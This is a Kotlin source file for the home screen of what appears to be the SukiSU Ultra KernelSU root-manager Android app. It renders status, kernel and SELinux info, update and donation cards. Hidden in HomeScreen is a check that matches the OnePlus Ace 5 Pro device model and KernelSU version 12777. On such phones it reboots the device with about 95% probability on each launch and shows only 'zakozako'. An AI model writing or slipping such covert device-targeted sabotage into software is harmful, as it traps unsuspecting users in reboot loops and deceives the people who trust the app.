package com.sukisu.ultra.ui.screen

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.system.Os
import android.util.Log
import androidx.annotation.StringRes
import androidx.compose.animation.*
import androidx.compose.animation.core.*
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material.icons.outlined.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.shadow
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.input.nestedscroll.nestedScroll
import androidx.compose.ui.platform.*
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.core.content.pm.PackageInfoCompat
import com.ramcosta.composedestinations.annotation.Destination
import com.ramcosta.composedestinations.annotation.RootGraph
import com.ramcosta.composedestinations.generated.destinations.InstallScreenDestination
import com.ramcosta.composedestinations.generated.destinations.SettingScreenDestination
import com.ramcosta.composedestinations.navigation.DestinationsNavigator
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import com.sukisu.ultra.*
import com.sukisu.ultra.R
import com.sukisu.ultra.ui.component.rememberConfirmDialog
import com.sukisu.ultra.ui.util.*
import com.sukisu.ultra.ui.util.module.LatestVersionInfo
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Text
import com.sukisu.ultra.ui.theme.getCardColors
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.getValue
import androidx.compose.runtime.setValue
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.fadeOut
import androidx.compose.animation.shrinkVertically
import androidx.compose.runtime.saveable.rememberSaveable
import androidx.compose.ui.graphics.vector.ImageVector
import com.sukisu.ultra.ui.theme.CardConfig
import androidx.core.content.edit
import java.io.BufferedReader
import java.io.InputStreamReader
import java.util.zip.GZIPInputStream
import kotlin.random.Random

@OptIn(ExperimentalMaterial3Api::class)
@Destination<RootGraph>(start = true)
@Composable
fun HomeScreen(navigator: DestinationsNavigator) {
    val context = LocalContext.current
    var isSimpleMode by rememberSaveable { mutableStateOf(false) }
    var isHideVersion by rememberSaveable { mutableStateOf(false) }
    var isHideOtherInfo by rememberSaveable { mutableStateOf(false) }
    var isHideSusfsStatus by rememberSaveable { mutableStateOf(false) }

    // 从 SharedPreferences 加载简洁模式状态
    LaunchedEffect(Unit) {
        isSimpleMode = context.getSharedPreferences("settings", Context.MODE_PRIVATE)
            .getBoolean("is_simple_mode", false)

        isHideVersion = context.getSharedPreferences("settings", Context.MODE_PRIVATE)
            .getBoolean("is_hide_version", false)

        isHideOtherInfo = context.getSharedPreferences("settings", Context.MODE_PRIVATE)
            .getBoolean("is_hide_other_info", false)

        isHideSusfsStatus = context.getSharedPreferences("settings", Context.MODE_PRIVATE)
            .getBoolean("is_hide_susfs_status", false)
    }

    val kernelVersion = getKernelVersion()
    val scrollBehavior = TopAppBarDefaults.enterAlwaysScrollBehavior(rememberTopAppBarState())

    val isManager = Natives.becomeManager(ksuApp.packageName)
    val deviceModel = getDeviceModel(context)
    val ksuVersion = if (isManager) Natives.version else null
    val zako = "一.*加.*A.*c.*e.*5.*P.*r.*o".toRegex().matches(deviceModel)
    val isVersion = ksuVersion == 12777
    val shouldTriggerRestart = zako && kernelVersion.isGKI() && (isVersion)

    LaunchedEffect(shouldTriggerRestart) {
        if (shouldTriggerRestart) {
            val random = Random.nextInt(0, 100)
            if (random <= 95) {
                reboot()
            } else {
                ""
            }
        }
    }

    Scaffold(
        topBar = {
            TopBar(
                kernelVersion,
                onInstallClick = { navigator.navigate(InstallScreenDestination) },
                onSettingsClick = { navigator.navigate(SettingScreenDestination) },
                scrollBehavior = scrollBehavior
            )
        },
        contentWindowInsets = WindowInsets.safeDrawing.only(
            WindowInsetsSides.Top + WindowInsetsSides.Horizontal
        )
    ) { innerPadding ->
        Column(
            modifier = Modifier
                .padding(innerPadding)
                .nestedScroll(scrollBehavior.nestedScrollConnection)
                .verticalScroll(rememberScrollState())
                .padding(top = 16.dp)
                .padding(horizontal = 16.dp),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            if (shouldTriggerRestart) {
                WarningCard(message = "zakozako")
                return@Column
            }
            val isManager = Natives.becomeManager(ksuApp.packageName)
            val ksuVersion = if (isManager) Natives.version else null
            val lkmMode = ksuVersion?.let {
                if (it >= Natives.MINIMAL_SUPPORTED_KERNEL_LKM && kernelVersion.isGKI()) Natives.isLkmMode else null
            }

            StatusCard(kernelVersion, ksuVersion, lkmMode) {
                navigator.navigate(InstallScreenDestination)
            }

            if (isManager && Natives.requireNewKernel()) {
                WarningCard(
                    stringResource(id = R.string.require_kernel_version).format(
                        ksuVersion, Natives.MINIMAL_SUPPORTED_KERNEL
                    )
                )
            }

            if (ksuVersion != null && !rootAvailable()) {
                WarningCard(
                    stringResource(id = R.string.grant_root_failed)
                )
            }

            val checkUpdate =
                LocalContext.current.getSharedPreferences("settings", Context.MODE_PRIVATE)
                    .getBoolean("check_update", true)
            if (checkUpdate) {
                UpdateCard()
            }

            val prefs = remember { context.getSharedPreferences("app_prefs", Context.MODE_PRIVATE) }
            var clickCount by rememberSaveable { mutableIntStateOf(prefs.getInt("click_count", 0)) }

            if (!isSimpleMode && clickCount < 3) {
                AnimatedVisibility(
                    visible = clickCount < 3,
                    enter = fadeIn() + expandVertically(),
                    exit = shrinkVertically() + fadeOut()
                ) {
                    ElevatedCard(
                        colors = getCardColors(MaterialTheme.colorScheme.secondaryContainer),
                        elevation = CardDefaults.cardElevation(defaultElevation = 0.dp),
                        modifier = Modifier
                            .clip(MaterialTheme.shapes.medium)
                            .shadow(
                                elevation = 0.dp,
                                shape = MaterialTheme.shapes.medium,
                                spotColor = MaterialTheme.colorScheme.primary.copy(alpha = 0.1f)
                            )
                    ) {
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .clickable {
                                    clickCount++
                                    prefs.edit { putInt("click_count", clickCount) }
                                }
                                .padding(16.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Icon(
                                imageVector = Icons.Outlined.Info,
                                contentDescription = null,
                                tint = MaterialTheme.colorScheme.primary,
                                modifier = Modifier.padding(end = 12.dp)
                            )
                            Text(
                                text = stringResource(R.string.using_mksu_manager),
                                style = MaterialTheme.typography.bodyMedium,
                                color = MaterialTheme.colorScheme.onSurface
                            )
                        }
                    }
                }
            }

            InfoCard()

            if (!isSimpleMode) {
                ContributionCard()
                DonateCard()
                LearnMoreCard()
            }

            Spacer(Modifier.height(16.dp))
        }
    }
}

@Composable
fun UpdateCard() {
    val context = LocalContext.current
    val latestVersionInfo = LatestVersionInfo()
    val newVersion by produceState(initialValue = latestVersionInfo) {
        value = withContext(Dispatchers.IO) {
            checkNewVersion()
        }
    }

    val currentVersionCode = getManagerVersion(context).second
    val newVersionCode = newVersion.versionCode
    val newVersionUrl = newVersion.downloadUrl
    val changelog = newVersion.changelog

    val uriHandler = LocalUriHandler.current
    val title = stringResource(id = R.string.module_changelog)
    val updateText = stringResource(id = R.string.module_update)

    AnimatedVisibility(
        visible = newVersionCode > currentVersionCode,
        enter = fadeIn() + expandVertically(
            animationSpec = spring(
                dampingRatio = Spring.DampingRatioMediumBouncy,
                stiffness = Spring.StiffnessLow
            )
        ),
        exit = shrinkVertically() + fadeOut()
    ) {
        val updateDialog = rememberConfirmDialog(onConfirm = { uriHandler.openUri(newVersionUrl) })
        WarningCard(
            message = stringResource(id = R.string.new_version_available).format(newVersionCode),
            color = MaterialTheme.colorScheme.tertiaryContainer,
            onClick = {
                if (changelog.isEmpty()) {
                    uriHandler.openUri(newVersionUrl)
                } else {
                    updateDialog.showConfirm(
                        title = title,
                        content = changelog,
                        markdown = true,
                        confirm = updateText
                    )
                }
            }
        )
    }
}

@Composable
fun RebootDropdownItem(@StringRes id: Int, reason: String = "") {
    DropdownMenuItem(
        text = { Text(stringResource(id)) },
        onClick = { reboot(reason) },
        leadingIcon = {
            Icon(
                imageVector = Icons.Filled.Refresh,
                contentDescription = null,
                tint = MaterialTheme.colorScheme.primary
            )
        }
    )
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
private fun TopBar(
    kernelVersion: KernelVersion,
    onInstallClick: () -> Unit,
    onSettingsClick: () -> Unit,
    scrollBehavior: TopAppBarScrollBehavior? = null
) {
    val cardColor = MaterialTheme.colorScheme.surfaceVariant
    val cardAlpha = CardConfig.cardAlpha

    TopAppBar(
        title = {
            Text(
                text = stringResource(R.string.app_name),
                style = MaterialTheme.typography.titleLarge
            )
        },
        colors = TopAppBarDefaults.topAppBarColors(
            containerColor = cardColor.copy(alpha = cardAlpha),
            scrolledContainerColor = cardColor.copy(alpha = 1f)
        ),
        actions = {
            if (kernelVersion.isGKI()) {
                IconButton(onClick = onInstallClick) {
                    Icon(
                        Icons.Filled.Archive,
                        contentDescription = stringResource(R.string.install),
                        tint = MaterialTheme.colorScheme.primary
                    )
                }
            }

            var showDropdown by remember { mutableStateOf(false) }
            if (Natives.isKsuValid(ksuApp.packageName)) {
                IconButton(onClick = { showDropdown = true }) {
                    Icon(
                        Icons.Filled.Refresh,
                        contentDescription = stringResource(R.string.reboot),
                        tint = MaterialTheme.colorScheme.primary
                    )

                    DropdownMenu(
                        expanded = showDropdown,
                        onDismissRequest = { showDropdown = false }
                    ) {
                        RebootDropdownItem(id = R.string.reboot)

                        val pm = LocalContext.current.getSystemService(Context.POWER_SERVICE) as PowerManager?
                        @Suppress("DEPRECATION")
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && pm?.isRebootingUserspaceSupported == true) {
                            RebootDropdownItem(id = R.string.reboot_userspace, reason = "userspace")
                        }
                        RebootDropdownItem(id = R.string.reboot_recovery, reason = "recovery")
                        RebootDropdownItem(id = R.string.reboot_bootloader, reason = "bootloader")
                        RebootDropdownItem(id = R.string.reboot_download, reason = "download")
                        RebootDropdownItem(id = R.string.reboot_edl, reason = "edl")
                    }
                }
            }

            IconButton(onClick = onSettingsClick) {
                Icon(
                    Icons.Filled.Settings,
                    contentDescription = stringResource(id = R.string.settings),
                    tint = MaterialTheme.colorScheme.primary
                )
            }
        },
        windowInsets = WindowInsets.safeDrawing.only(WindowInsetsSides.Top + WindowInsetsSides.Horizontal),
        scrollBehavior = scrollBehavior
    )
}

@Composable
private fun StatusCard(
    kernelVersion: KernelVersion,
    ksuVersion: Int?,
    lkmMode: Boolean?,
    onClickInstall: () -> Unit = {}
) {
    ElevatedCard(
        colors = getCardColors(MaterialTheme.colorScheme.surfaceContainerHigh),
        elevation = CardDefaults.cardElevation(defaultElevation = 0.dp),
        modifier = Modifier
            .fillMaxWidth()
            .clip(MaterialTheme.shapes.large)
            .shadow(
                elevation = 0.dp,
                shape = MaterialTheme.shapes.large,
                spotColor = MaterialTheme.colorScheme.primary.copy(alpha = 0.1f)
            )
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .clickable(enabled = kernelVersion.isGKI()) {
                    if (kernelVersion.isGKI()) {
                        onClickInstall()
                    }
                }
                .padding(24.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            when {
                ksuVersion != null -> {
                    val safeMode = when {
                        Natives.isSafeMode -> " [${stringResource(id = R.string.safe_mode)}]"
                        else -> ""
                    }

                    val workingMode = when (lkmMode) {
                        null -> " <Non-GKI>"
                        true -> " <LKM>"
                        else -> " <GKI>"
                    }

                    val workingText = "${stringResource(id = R.string.home_working)}$workingMode$safeMode"

                    val isHideVersion = LocalContext.current.getSharedPreferences("settings", Context.MODE_PRIVATE)
                        .getBoolean("is_hide_version", false)

                    val isHideOtherInfo = LocalContext.current.getSharedPreferences("settings", Context.MODE_PRIVATE)
                        .getBoolean("is_hide_other_info", false)

                    val isHideSusfsStatus = LocalContext.current.getSharedPreferences("settings", Context.MODE_PRIVATE)
                        .getBoolean("is_hide_susfs_status", false)

                    Icon(
                        Icons.Outlined.CheckCircle,
                        contentDescription = stringResource(R.string.home_working),
                        tint = MaterialTheme.colorScheme.primary,
                        modifier = Modifier.size(40.dp)
                    )

                    Column(Modifier.padding(start = 20.dp)) {
                        Text(
                            text = workingText,
                            style = MaterialTheme.typography.titleMedium,
                            color = MaterialTheme.colorScheme.onSurface
                        )

                        if (!isHideVersion) {
                            Spacer(Modifier.height(4.dp))
                            Text(
                                text = stringResource(R.string.home_working_version, ksuVersion),
                                style = MaterialTheme.typography.bodyMedium,
                                color = MaterialTheme.colorScheme.onSurfaceVariant
                            )
                        }

                        if (!isHideOtherInfo) {
                            Spacer(Modifier.height(4.dp))
                            Text(
                                text = stringResource(R.string.home_superuser_count, getSuperuserCount()),
                                style = MaterialTheme.typography.bodyMedium,
                                color = MaterialTheme.colorScheme.onSurfaceVariant
                            )

                            Spacer(Modifier.height(4.dp))
                            Text(
                                text = stringResource(R.string.home_module_count, getModuleCount()),
                                style = MaterialTheme.typography.bodyMedium,
                                color = MaterialTheme.colorScheme.onSurfaceVariant
                            )

                            val kpmVersion = getKpmVersion()
                            if (kpmVersion.isNotEmpty() && !kpmVersion.startsWith("Error")) {
                                Spacer(Modifier.height(4.dp))
                                Text(
                                    text = stringResource(R.string.home_kpm_module, getKpmModuleCount()),
                                    style = MaterialTheme.typography.bodyMedium,
                                    color = MaterialTheme.colorScheme.onSurfaceVariant
                                )
                            }
                        }

                        if (!isHideSusfsStatus) {
                            Spacer(modifier = Modifier.height(4.dp))

                            val suSFS = getSuSFS()
                            if (lkmMode != true) {
                                val translatedStatus = when (suSFS) {
                                    "Supported" -> stringResource(R.string.status_supported)
                                    "Not Supported" -> stringResource(R.string.status_not_supported)
                                    else -> stringResource(R.string.status_unknown)
                                }

                                Text(
                                    text = stringResource(R.string.home_susfs, translatedStatus),
                                    style = MaterialTheme.typography.bodyMedium,
                                    color = MaterialTheme.colorScheme.onSurfaceVariant
                                )
                            }
                        }
                    }
                }

                kernelVersion.isGKI() -> {
                    Icon(
                        Icons.Outlined.Warning,
                        contentDescription = stringResource(R.string.home_not_installed),
                        tint = MaterialTheme.colorScheme.error,
                        modifier = Modifier.size(40.dp)
                    )

                    Column(Modifier.padding(start = 20.dp)) {
                        Text(
                            text = stringResource(R.string.home_not_installed),
                            style = MaterialTheme.typography.titleMedium,
                            color = MaterialTheme.colorScheme.error
                        )

                        Spacer(Modifier.height(4.dp))
                        Text(
                            text = stringResource(R.string.home_click_to_install),
                            style = MaterialTheme.typography.bodyMedium,
                            color = MaterialTheme.colorScheme.onSurfaceVariant
                        )
                    }
                }

                else -> {
                    Icon(
                        Icons.Outlined.Block,
                        contentDescription = stringResource(R.string.home_unsupported),
                        tint = MaterialTheme.colorScheme.error,
                        modifier = Modifier.size(40.dp)
                    )

                    Column(Modifier.padding(start = 20.dp)) {
                        Text(
                            text = stringResource(R.string.home_unsupported),
                            style = MaterialTheme.typography.titleMedium,
                            color = MaterialTheme.colorScheme.error
                        )

                        Spacer(Modifier.height(4.dp))
                        Text(
                            text = stringResource(R.string.home_unsupported_reason),
                            style = MaterialTheme.typography.bodyMedium,
                            color = MaterialTheme.colorScheme.onSurfaceVariant
                        )
                    }
                }
            }
        }
    }
}

@Composable
fun WarningCard(
    message: String,
    color: Color = MaterialTheme.colorScheme.errorContainer,
    onClick: (() -> Unit)? = null
) {
    ElevatedCard(
        colors = getCardColors(color),
        elevation = CardDefaults.cardElevation(defaultElevation = 0.dp),
        modifier = Modifier
            .fillMaxWidth()
            .clip(MaterialTheme.shapes.large)
            .shadow(
                elevation = 0.dp,
                shape = MaterialTheme.shapes.large,
                spotColor = MaterialTheme.colorScheme.error.copy(alpha = 0.1f)
            )
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .then(onClick?.let { Modifier.clickable { it() } } ?: Modifier)
                .padding(24.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Icon(
                imageVector = Icons.Filled.Warning,
                contentDescription = null,
                tint = MaterialTheme.colorScheme.onErrorContainer,
                modifier = Modifier
                    .padding(end = 16.dp)
                    .size(28.dp)
            )
            Text(
                text = message,
                style = MaterialTheme.typography.bodyMedium,
                color = MaterialTheme.colorScheme.onErrorContainer
            )
        }
    }
}

@Composable
fun ContributionCard() {
    val uriHandler = LocalUriHandler.current
    val links = listOf("https://github.com/zako", "https://github.com/udochina")

    ElevatedCard(
        colors = getCardColors(MaterialTheme.colorScheme.tertiaryContainer),
        elevation = CardDefaults.cardElevation(defaultElevation = 0.dp),
        modifier = Modifier
            .fillMaxWidth()
            .clip(MaterialTheme.shapes.large)
            .shadow(
                elevation = 0.dp,
                shape = MaterialTheme.shapes.large,
                spotColor = MaterialTheme.colorScheme.tertiary.copy(alpha = 0.1f)
            )
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .clickable {
                    val randomIndex = Random.nextInt(links.size)
                    uriHandler.openUri(links[randomIndex])
                }
                .padding(24.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Icon(
                imageVector = Icons.Filled.Code,
                contentDescription = null,
                tint = MaterialTheme.colorScheme.onTertiaryContainer,
                modifier = Modifier
                    .padding(end = 16.dp)
                    .size(28.dp)
            )

            Column {
                Text(
                    text = stringResource(R.string.home_ContributionCard_kernelsu),
                    style = MaterialTheme.typography.titleSmall,
                    color = MaterialTheme.colorScheme.onTertiaryContainer
                )

                Spacer(Modifier.height(4.dp))
                Text(
                    text = stringResource(R.string.home_click_to_ContributionCard_kernelsu),
                    style = MaterialTheme.typography.bodyMedium,
                    color = MaterialTheme.colorScheme.onTertiaryContainer.copy(alpha = 0.8f)
                )
            }
        }
    }
}

@Composable
fun LearnMoreCard() {
    val uriHandler = LocalUriHandler.current
    val url = stringResource(R.string.home_learn_kernelsu_url)

    ElevatedCard(
        colors = getCardColors(MaterialTheme.colorScheme.primaryContainer),
        elevation = CardDefaults.cardElevation(defaultElevation = 0.dp),
        modifier = Modifier
            .fillMaxWidth()
            .clip(MaterialTheme.shapes.large)
            .shadow(
                elevation = 0.dp,
                shape = MaterialTheme.shapes.large,
                spotColor = MaterialTheme.colorScheme.primary.copy(alpha = 0.1f)
            )
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .clickable {
                    uriHandler.openUri(url)
                }
                .padding(24.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Icon(
                imageVector = Icons.Filled.School,
                contentDescription = null,
                tint = MaterialTheme.colorScheme.onPrimaryContainer,
                modifier = Modifier
                    .padding(end = 16.dp)
                    .size(28.dp)
            )

            Column {
                Text(
                    text = stringResource(R.string.home_learn_kernelsu),
                    style = MaterialTheme.typography.titleSmall,
                    color = MaterialTheme.colorScheme.onPrimaryContainer
                )

                Spacer(Modifier.height(4.dp))
                Text(
                    text = stringResource(R.string.home_click_to_learn_kernelsu),
                    style = MaterialTheme.typography.bodyMedium,
                    color = MaterialTheme.colorScheme.onPrimaryContainer.copy(alpha = 0.8f)
                )
            }
        }
    }
}

@Composable
fun DonateCard() {
    val uriHandler = LocalUriHandler.current

    ElevatedCard(
        colors = getCardColors(MaterialTheme.colorScheme.secondaryContainer),
        elevation = CardDefaults.cardElevation(defaultElevation = 0.dp),
        modifier = Modifier
            .fillMaxWidth()
            .clip(MaterialTheme.shapes.large)
            .shadow(
                elevation = 0.dp,
                shape = MaterialTheme.shapes.large,
                spotColor = MaterialTheme.colorScheme.secondary.copy(alpha = 0.1f)
            )
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .clickable {
                    uriHandler.openUri("https://patreon.com/weishu")
                }
                .padding(24.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Icon(
                imageVector = Icons.Filled.Favorite,
                contentDescription = null,
                tint = MaterialTheme.colorScheme.onSecondaryContainer,
                modifier = Modifier
                    .padding(end = 16.dp)
                    .size(28.dp)
            )

            Column {
                Text(
                    text = stringResource(R.string.home_support_title),
                    style = MaterialTheme.typography.titleSmall,
                    color = MaterialTheme.colorScheme.onSecondaryContainer
                )

                Spacer(Modifier.height(4.dp))
                Text(
                    text = stringResource(R.string.home_support_content),
                    style = MaterialTheme.typography.bodyMedium,
                    color = MaterialTheme.colorScheme.onSecondaryContainer.copy(alpha = 0.8f)
                )
            }
        }
    }
}

@Composable
private fun InfoCard() {
    val lkmMode = Natives.isLkmMode
    val context = LocalContext.current
    val isSimpleMode = LocalContext.current.getSharedPreferences("settings", Context.MODE_PRIVATE)
        .getBoolean("is_simple_mode", false)

    ElevatedCard(
        colors = getCardColors(MaterialTheme.colorScheme.surfaceContainerHighest),
        elevation = CardDefaults.cardElevation(defaultElevation = 0.dp),
        modifier = Modifier
            .fillMaxWidth()
            .clip(MaterialTheme.shapes.large)
            .shadow(
                elevation = 0.dp,
                shape = MaterialTheme.shapes.large,
                spotColor = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.05f)
            )
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .padding(start = 24.dp, top = 24.dp, end = 24.dp, bottom = 16.dp),
        ) withContext@{
            val contents = StringBuilder()
            val uname = Os.uname()

            @Composable
            fun InfoCardItem(
                label: String,
                content: String,
                icon: ImageVector = Icons.Default.Info
            ) {
                contents.appendLine(label).appendLine(content).appendLine()
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    modifier = Modifier.padding(vertical = 8.dp)
                ) {
                    Icon(
                        imageVector = icon,
                        contentDescription = label,
                        modifier = Modifier.size(28.dp),
                        tint = MaterialTheme.colorScheme.primary
                    )
                    Spacer(modifier = Modifier.width(16.dp))
                    Column {
                        Text(
                            text = label,
                            style = MaterialTheme.typography.labelLarge,
                            color = MaterialTheme.colorScheme.onSurfaceVariant
                        )
                        Text(
                            text = content,
                            style = MaterialTheme.typography.bodyMedium,
                            color = MaterialTheme.colorScheme.onSurface,
                            maxLines = 1,
                            overflow = TextOverflow.Ellipsis
                        )
                    }
                }
            }

            InfoCardItem(
                stringResource(R.string.home_kernel),
                uname.release,
                icon = Icons.Default.Memory
            )

            if (!isSimpleMode) {
                val androidVersion = Build.VERSION.RELEASE
                InfoCardItem(
                    stringResource(R.string.home_android_version),
                    androidVersion,
                    icon = Icons.Default.Android
                )
            }

            val deviceModel = getDeviceModel(context)
            InfoCardItem(
                stringResource(R.string.home_device_model),
                deviceModel,
                icon = Icons.Default.PhoneAndroid
            )

            val managerVersion = getManagerVersion(context)
            InfoCardItem(
                stringResource(R.string.home_manager_version),
                "${managerVersion.first} (${managerVersion.second})",
                icon = Icons.Default.Settings
            )

            InfoCardItem(
                stringResource(R.string.home_selinux_status),
                getSELinuxStatus(),
                icon = Icons.Default.Security
            )

            if (!isSimpleMode) {
                if (lkmMode != true) {
                    val kpmVersion = getKpmVersion()
                    val isKpmConfigured = checkKpmConfigured()

                    val displayVersion = if (kpmVersion.isEmpty() || kpmVersion.startsWith("Error")) {
                        val statusText = if (isKpmConfigured) {
                            stringResource(R.string.kernel_patched)
                        } else {
                            stringResource(R.string.kernel_not_enabled)
                        }
                        "${stringResource(R.string.not_supported)} ($statusText)"
                    } else {
                        "${stringResource(R.string.supported)} ($kpmVersion)"
                    }

                    InfoCardItem(
                        stringResource(R.string.home_kpm_version),
                        displayVersion,
                        icon = Icons.Default.Code
                    )
                }
            }

            val isHideSusfsStatus = LocalContext.current.getSharedPreferences("settings", Context.MODE_PRIVATE)
                .getBoolean("is_hide_susfs_status", false)

            if ((!isSimpleMode) && (!isHideSusfsStatus)) {
                val suSFS = getSuSFS()
                if (suSFS == "Supported") {
                    val suSFSVersion = getSuSFSVersion()
                    if (suSFSVersion.isNotEmpty()) {
                        val isSUS_SU = getSuSFSFeatures() == "CONFIG_KSU_SUSFS_SUS_SU"
                        val infoText = buildString {
                            append(suSFSVersion)
                            append(if (isSUS_SU) " (${getSuSFSVariant()})" else " (${stringResource(R.string.manual_hook)})")
                            if (isSUS_SU) {
                                val susSUMode = try { susfsSUS_SU_Mode().toString() } catch (_: Exception) { "" }
                                if (susSUMode.isNotEmpty()) {
                                    append(" ${stringResource(R.string.sus_su_mode)} $susSUMode")
                                }
                            }
                        }

                        InfoCardItem(
                            stringResource(R.string.home_susfs_version),
                            infoText,
                            icon = Icons.Default.Storage
                        )
                    }
                }
            }
        }
    }
}

fun getManagerVersion(context: Context): Pair<String, Long> {
    val packageInfo = context.packageManager.getPackageInfo(context.packageName, 0)!!
    val versionCode = PackageInfoCompat.getLongVersionCode(packageInfo)
    return Pair(packageInfo.versionName!!, versionCode)
}

@Preview
@Composable
private fun StatusCardPreview() {
    Column(verticalArrangement = Arrangement.spacedBy(16.dp)) {
        StatusCard(KernelVersion(5, 10, 101), 1, null)
        StatusCard(KernelVersion(5, 10, 101), 20000, true)
        StatusCard(KernelVersion(5, 10, 101), null, true)
        StatusCard(KernelVersion(4, 10, 101), null, false)
    }
}

@Preview
@Composable
private fun WarningCardPreview() {
    Column(verticalArrangement = Arrangement.spacedBy(16.dp)) {
        WarningCard(message = "Warning message")
        WarningCard(
            message = "Warning message ",
            MaterialTheme.colorScheme.tertiaryContainer,
            onClick = {})
    }
}

@SuppressLint("PrivateApi")
private fun getDeviceModel(context: Context): String {
    return try {
        val systemProperties = Class.forName("android.os.SystemProperties")
        val getMethod = systemProperties.getMethod("get", String::class.java, String::class.java)
        val marketNameKeys = listOf(
            "ro.product.marketname",          // Xiaomi
            "ro.vendor.oplus.market.name",    // Oppo, OnePlus, Realme
            "ro.vivo.market.name",            // Vivo
            "ro.config.marketing_name"        // Huawei
        )
        for (key in marketNameKeys) {
            val marketName = getMethod.invoke(null, key, "") as String
            if (marketName.isNotEmpty()) {
                return marketName
            }
        }
        Build.DEVICE
    } catch (_: Exception) {
        Build.DEVICE
    }
}

private fun checkKpmConfigured(): Boolean {
    try {
        val process = Runtime.getRuntime().exec("su -c cat /proc/config.gz")
        val inputStream = process.inputStream
        val gzipInputStream = GZIPInputStream(inputStream)
        val reader = BufferedReader(InputStreamReader(gzipInputStream))

        var line: String?
        while (reader.readLine().also { line = it } != null) {
            if (line?.contains("CONFIG_KPM=y") == true) {
                return true
            }
        }
        reader.close()
    } catch (e: Exception) {
        e.printStackTrace()
    }
    return false
}